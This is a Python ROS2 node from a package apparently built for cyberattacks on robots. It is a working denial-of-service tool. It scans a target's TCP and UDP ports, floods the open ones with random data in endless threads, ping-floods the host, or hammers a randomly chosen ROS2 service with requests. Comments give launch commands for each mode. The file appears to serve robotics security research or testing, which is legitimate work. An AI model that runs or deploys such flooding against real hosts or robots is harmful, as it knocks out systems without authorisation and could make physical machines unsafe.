import rclpy, sys
from rclpy.node import Node, NodeNameNonExistentError
from rclpy import Parameter
from std_srvs.srv import Empty
from rcl_interfaces.srv import GetParameters
from ros2node.api import get_node_names
from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
from roboticpark_cyberattacks.utils import rslg
from rcl_interfaces.srv import *
import random, socket
from ping3 import ping
import concurrent.futures
import importlib

class dosnode(Node):
    def __init__(self):
        super().__init__("dosnode")
        self.declare_parameter('dos_ip_objective', "Unset")
        self.declare_parameter('dos_node_objective', "Unset")
        self.declare_parameter('dos_type', 'Unset')
        self.declare_parameter('dos_protocol', 'tcp')
        self.declare_parameter('dos_workers', '1000')

def printargs(node):
    """Prints every param present in the node and its values

       Parameters
       ----------
       node: Node
         The node 
    """
    
    for i in node.get_parameters_by_prefix(''):
        pamname=i
        pamvalue=node.get_parameter(i)._value
        rslg(node,f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')

def checkService(node):
    objectiveParam = node.get_parameter('dos_node_objective')._value
    client = node.create_client(GetParameters, f'/{objectiveParam}/get_parameters')
    if not client.wait_for_service(timeout_sec=5.0):
        rslg(node,f'Not able to connect that node {objectiveParam}')
        sys.exit()

def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
    rslg(node,f'Udp ports {ports}')
    futures = []
    lenports = len(ports)

    if (lenports > 0):
        with concurrent.futures.ThreadPoolExecutor(max_workers=lenports) as executor:
            for port in ports:
                futures.append(executor.submit(dosSendRandomGarbageAuxUDP,ip=ipdest,node=node,port=port,socketObject=socketObject))
    else:
        rslg(node,f'0 open port detected')

def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
    data = (str(random.getrandbits(4096))).encode()
    s = socket.socket(socket.AF_INET, socketObject)
    rslg(node,f'Launching garbage into {ip} udp port {port}')
    while True:
        s.sendto(data, (ip, port))

def dosSendRandomGarbageTCP(ipdest,node,ports,socketObject):
    rslg(node,f'Tcp ports {ports}')
    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ports)) as executor:
        for port in ports:
            futures.append(executor.submit(dosSendRandomGarbageAuxTCP,ip=ipdest,node=node,port=port,socketObject=socketObject))

def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
    while True:
        try: 
            data = (str(random.getrandbits(4096))).encode()
            s = socket.socket(socket.AF_INET, socketObject)
            s.connect((ip, port))
            #rslg(node,f'Launching garbage into {ip} tcp port {port}')
            s.sendall(data)
            s.close()
        except (socket.error, BrokenPipeError) as e:
            print(f"Error: {e}. Reconnecting...")

def dosSendPing(ipdest,workers):
    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(workers)) as executor:
        for _ in workers:
            futures.append(executor.submit(dosSendPingAux,ip=ipdest))

def dosSendPingAux(ip):
    while True:
        try:
            ping(ip)
        except Exception as e:
            print(f"Error: {e}")

def dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,workers):
    moduleName, class_name = nodeObjectiveType.rsplit('/', 1)
    moduleName = moduleName.replace('/', '.')
    module = importlib.import_module(moduleName)
    dosObjectiveClass = getattr(module, class_name)
    futures = []

    # Configure request
    sclient = mydosnode.create_client(dosObjectiveClass,nodeObjectiveServer)
    while not sclient.wait_for_service(timeout_sec=1.0):
        mydosnode.get_logger().info(f'service {mydosnode} not available, waiting again...')
    request = dosObjectiveClass.Request()

    while True:
        # print(nodeObjectiveServer)
        # print(workers)
        # print(int(workers))
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(workers)) as executor:
            for _ in range(int(workers)):
                futures.append(executor.submit(dosFillServiceAux,sclient=sclient,request=request))

def dosFillServiceAux(sclient,request):
    future = sclient.call_async(request)
    print(future.result())


def main():
    rclpy.init()
    mydosnode = dosnode()
    printargs(mydosnode)

    # Obtain values passed by parameters.
    ipobjectiveParam = mydosnode.get_parameter('dos_ip_objective')._value
    dostype = mydosnode.get_parameter('dos_type')._value
    dosprotocol = mydosnode.get_parameter('dos_protocol')._value
    dosworkers = mydosnode.get_parameter('dos_workers')._value
    dosnodename = mydosnode.get_parameter('dos_node_objective')._value
    portrange = range(1, 65535)  # Scan ports
    portrangeudp = range(1, 1024)  # Scan ports

    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter to get the ip
    # TODO: Maybe I should try DDS with python to get the ip of a node.
    # How to invoke them
    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ping.yaml 
    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.tcp.yaml 
    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.udp.yaml 
    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ros2.fill.yaml 

    if ipobjectiveParam == 'Unset':
        checkService(mydosnode)
        rslg(mydosnode,f'We try to fill any of the servi(ces:  {dosnodename} was chosen')
        nodeServiceList = []
        try:
            nodeServiceList = mydosnode.get_service_names_and_types_by_node(dosnodename,'')
        except NodeNameNonExistentError as e:
            rslg(mydosnode,f'Service list: {nodeServiceList}')
            rslg(mydosnode,f'No node with that name {e}')
            sys.exit()


        # We choose a random service
        nodeParam = random.choice(nodeServiceList)
        try:
            nodeObjectiveServer = nodeParam[0]
            nodeObjectiveType = nodeParam[1][0]
            rslg(mydosnode,f'Servicio {nodeObjectiveServer} Tipo de parámetro {nodeObjectiveType}')
            dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,dosworkers)
        except Exception as e:
            rslg(mydosnode,f'No service available in this node {e}')
            sys.exit()


    else:
        mydosnode.get_logger().info(f'Regular dos attack, we can choose between ping and random garbage:  {dostype} was chosen')

        if dostype == 'dos_port_garbage':
            if dosprotocol == 'tcp':
                rslg(mydosnode,'Attacking tcp ports')
                dosSendRandomGarbageTCP(ipobjectiveParam,mydosnode,scan_tcp_ports(ipobjectiveParam,portrange),socket.SOCK_STREAM)
            else:
                # Too powerful. We avoid to kill ourselves by mistake
                if ipobjectiveParam != '127.0.0.1':
                    rslg(mydosnode,'Attacking udp ports')
                    dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrangeudp),socket.SOCK_DGRAM)
        else:
            if dostype == 'dos_ping_bruteforce':
                rslg(mydosnode,f'Bruteforcing w {dosworkers}')
                try:
                    dosSendPing(ipobjectiveParam,dosworkers)
                except Exception as e:
                    print(f"Ping Error:{e}")

    rclpy.spin(mydosnode)
    rclpy.shutdown()


if __name__ == '__main__':
    main()
